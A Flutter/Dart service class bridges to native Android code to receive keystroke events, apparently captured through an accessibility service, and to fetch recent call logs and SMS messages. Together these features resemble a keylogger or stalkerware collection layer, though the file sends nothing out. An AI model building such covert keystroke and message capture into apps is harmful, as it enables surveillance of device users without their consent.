import 'package:flutter/services.dart';
import 'package:flutter/material.dart';

// handles all method channel communication with native android layer
class MethodChannelService {
  static const _channel = MethodChannel('com.example.app/events');

  // callback invoked when native side pushes a keystroke event
  Function(String)? onKeyStrokeReceived;

  // initialize the method channel listener
  void init() {
    _channel.setMethodCallHandler((call) async {
      if (call.method == 'onKeyStroke') {
        final text = call.arguments as String;
        debugPrint('Received from native: $text');
        onKeyStrokeReceived?.call(text);
      }
    });
  }

  // check if accessibility service is enabled on the device
  Future<bool> isAccessibilityEnabled() async {
    try {
      final bool result = await _channel.invokeMethod('isAccessibilityEnabled');
      return result;
    } catch (e) {
      debugPrint('Accessibility check error: $e');
      return false;
    }
  }

  // open the system accessibility settings screen
  Future<void> openAccessibilitySettings() async {
    try {
      await _channel.invokeMethod('openAccessibilitySettings');
    } catch (e) {
      debugPrint('Open accessibility settings error: $e');
    }
  }

  // fetch last 30 call log entries from native layer
  Future<List<Map<String, dynamic>>> getCallLogs() async {
    try {
      final List<dynamic> result = await _channel.invokeMethod('getCallLogs');
      // Convert List<dynamic> to List<Map<String, dynamic>>
      return result.map((e) => Map<String, dynamic>.from(e as Map)).toList();
    } catch (e) {
      debugPrint('Get call logs error: $e');
      return [];
    }
  }

  // fetch last 50 SMS entries from native layer
  Future<List<Map<String, dynamic>>> getSmsLogs() async {
    try {
      final List<dynamic> result = await _channel.invokeMethod('getSmsLogs');
      return result.map((e) => Map<String, dynamic>.from(e as Map)).toList();
    } catch (e) {
      debugPrint('Get SMS logs error: $e');
      return [];
    }
  }
}
